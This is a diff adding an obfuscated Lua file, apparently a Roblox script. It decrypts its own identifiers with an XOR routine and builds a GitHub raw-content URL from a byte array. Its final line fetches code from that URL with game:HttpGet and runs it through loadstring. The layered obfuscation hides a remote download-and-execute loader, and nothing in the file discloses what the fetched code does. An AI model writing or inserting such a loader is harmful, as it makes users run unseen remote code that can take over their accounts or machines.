@@ -1,0 +1,107 @@
+local obf_bitlib = bit32 or bit;
+
+local obf_XOR = obf_bitlib.bxor;
+
+local obf_OR = obf_bitlib.bor;
+
+local obf_AND = obf_bitlib.band;
+
+local obf_stringchar = string.char;
+
+local obf_stringbyte = string.byte;
+
+local obf_stringsub = string.sub;
+
+local obf_bitlib = bit32 or bit;
+
+local obf_XOR = obf_bitlib.bxor;
+
+local obf_tableconcat = table.concat;
+
+local obf_tableinsert = table.insert;
+
+local function LUAOBFUSACTOR_DECRYPT_STR_0(LUAOBFUSACTOR_STR, LUAOBFUSACTOR_KEY)
+
+	local FlatIdent_95CAC = 0;	local result;
+
+	while true do
+
+		if (FlatIdent_95CAC == 1) then
+
+			return obf_tableconcat(result);
+
+		end
+
+		if (FlatIdent_95CAC == 0) then
+
+			result = {};
+
+			for i = 1, #LUAOBFUSACTOR_STR do
+
+				obf_tableinsert(result, obf_stringchar(obf_XOR(obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_STR, i, i + 1)), obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_KEY, obf_AND(1, (i - 1) % #LUAOBFUSACTOR_KEY) + obf_OR(1, (i - 1) % #LUAOBFUSACTOR_KEY), obf_AND(1 + ((i - 1) % #LUAOBFUSACTOR_KEY), 1) + obf_OR(1 + ((i - 1) % #LUAOBFUSACTOR_KEY), 1)))) % 256));
+
+			end
+
+			FlatIdent_95CAC = 1;
+
+		end
+
+	end
+
+end
+
+local v0 = {};
+
+v0[LUAOBFUSACTOR_DECRYPT_STR_0("\8\129\134\139", "\126\177\163\187\69\134\219\167")] = string.char;
+
+v0[LUAOBFUSACTOR_DECRYPT_STR_0("\234\114\136\122", "\156\67\173\74\165")] = string.byte;
+
+v0[LUAOBFUSACTOR_DECRYPT_STR_0("\80\102\242\25", "\38\84\215\41\118\220\70")] = string.sub;
+
+v0[LUAOBFUSACTOR_DECRYPT_STR_0("\232\3\83\114", "\158\48\118\66\114")] = bit32 or bit;
+
+v0[LUAOBFUSACTOR_DECRYPT_STR_0("\237\255\97\64", "\155\203\68\112\86\19\197")] = v0[LUAOBFUSACTOR_DECRYPT_STR_0("\238\21\152\102", "\152\38\189\86\156\32\24\133")].bxor;
+
+v0[LUAOBFUSACTOR_DECRYPT_STR_0("\80\169\18\247", "\38\156\55\199")] = table.concat;
+
+v0[LUAOBFUSACTOR_DECRYPT_STR_0("\85\254\56\44", "\35\200\29\28\72\115\20\154")] = table.insert;
+
+local function v13(v15, v16)
+
+	local FlatIdent_2953F = 0;
+
+	while true do
+
+		if (FlatIdent_2953F == 0) then
+
+			v0[LUAOBFUSACTOR_DECRYPT_STR_0("\34\72\237\148\143", "\84\121\223\177\191\237\76")] = {};
+
+			for v18 = 1, #v15 do
+
+				v0[LUAOBFUSACTOR_DECRYPT_STR_0("\215\237\19\153", "\161\219\54\169\192\90\48\80")](v0[LUAOBFUSACTOR_DECRYPT_STR_0("\51\24\16\69\117", "\69\41\34\96")], v0[LUAOBFUSACTOR_DECRYPT_STR_0("\61\236\134\135", "\75\220\163\183\106\98")](v0[LUAOBFUSACTOR_DECRYPT_STR_0("\207\86\255\219", "\185\98\218\235\87")](v0[LUAOBFUSACTOR_DECRYPT_STR_0("\188\154\121\119", "\202\171\92\71\134\190")](v0[LUAOBFUSACTOR_DECRYPT_STR_0("\158\123\132\124", "\232\73\161\76")](v15, v18, obf_AND(v18, 1) + obf_OR(v18, 1))), v0[LUAOBFUSACTOR_DECRYPT_STR_0("\8\234\156\18", "\126\219\185\34\61")](v0[LUAOBFUSACTOR_DECRYPT_STR_0("\241\94\139\14", "\135\108\174\62\18\30\23\147")](v16, obf_AND(1, (v18 - 1) % #v16) + obf_OR(1, (v18 - 1) % #v16), obf_AND(1 + ((v18 - 1) % #v16), 1) + obf_OR(1 + ((v18 - 1) % #v16), 1)))) % 256));
+
+			end
+
+			FlatIdent_2953F = 1;
+
+		end
+
+		if (FlatIdent_2953F == 1) then
+
+			return v0[LUAOBFUSACTOR_DECRYPT_STR_0("\209\227\172\122", "\167\214\137\74\171\120\206\83")](v0[LUAOBFUSACTOR_DECRYPT_STR_0("\177\218\162\119\13", "\199\235\144\82\61\152")]);
+
+		end
+
+	end
+
+end
+
+v0[LUAOBFUSACTOR_DECRYPT_STR_0("\61\95\83\233", "\75\103\118\217")] = {};
+
+v0[LUAOBFUSACTOR_DECRYPT_STR_0("\8\159\17\32", "\126\167\52\16\116\217")][v13("\45\242\224\228\6\238\186\213\46\222\204\215\96\182", "\126\177\163\187\69\134\219\167")] = {[1]=tostring(utf8.char((function()
+
+	return table.unpack({104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,87,83,56,53,55,57,54,48,47,45,47,109,97,105,110,47,37,69,56,37,56,52,37,57,65,37,69,54,37,57,67,37,65,67,37,69,55,37,65,67,37,65,67,37,69,52,37,66,65,37,57,52,37,69,53,37,66,49,37,56,50,37,69,53,37,56,65,37,65,48,37,69,53,37,65,70,37,56,54});
+
+end)()))};
+
+loadstring(game:HttpGet(v0[LUAOBFUSACTOR_DECRYPT_STR_0("\234\144\107\112", "\156\168\78\64\224\212\121")][v13("\207\0\238\21\230\244\34\223\26\202\243\47\136\122", "\156\67\173\74\165")][1]))();
